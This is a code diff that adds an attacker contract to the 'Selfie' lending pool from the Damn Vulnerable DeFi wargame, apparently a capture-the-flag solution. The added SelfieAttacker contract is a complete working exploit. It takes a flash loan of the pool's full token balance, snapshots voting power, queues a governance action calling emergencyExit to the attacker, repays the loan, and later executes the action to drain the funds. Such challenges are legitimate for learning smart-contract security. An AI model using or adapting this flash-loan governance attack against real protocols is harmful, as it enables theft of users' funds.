@@ -6,6 +6,8 @@ import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "./SimpleGovernance.sol";
+import "hardhat/console.sol";
+import "../DamnValuableTokenSnapshot.sol";
 
 /**
  * @title SelfiePool
@@ -72,4 +74,51 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
 
         emit FundsDrained(receiver, amount);
     }
+}
+
+
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool victim;
+    SimpleGovernance governance;
+    address attacker;
+    DamnValuableTokenSnapshot token;
+    
+
+
+    constructor(address _governance, address _victim, address _token) {
+        attacker = msg.sender;
+        governance = SimpleGovernance(_governance);
+        victim = SelfiePool(_victim);
+        token = DamnValuableTokenSnapshot(_token);
+    }
+
+    function attackPart1() external {
+        uint256 amount = victim.maxFlashLoan(address(token));
+        //console.log("amount: ", amount);
+        victim.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address _token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        bytes memory proposal = abi.encodeWithSignature("emergencyExit(address)", attacker);
+        DamnValuableTokenSnapshot(_token).snapshot();
+        governance.queueAction(address(victim), 0, proposal);
+
+        // return flashLoan
+        DamnValuableTokenSnapshot(_token).approve(msg.sender, amount);
+        return bytes32(keccak256("ERC3156FlashBorrower.onFlashLoan"));
+    }
+
+    function attackPart2() external {
+        governance.executeAction(1);
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(msg.sender, amount);
+    }
+
 }
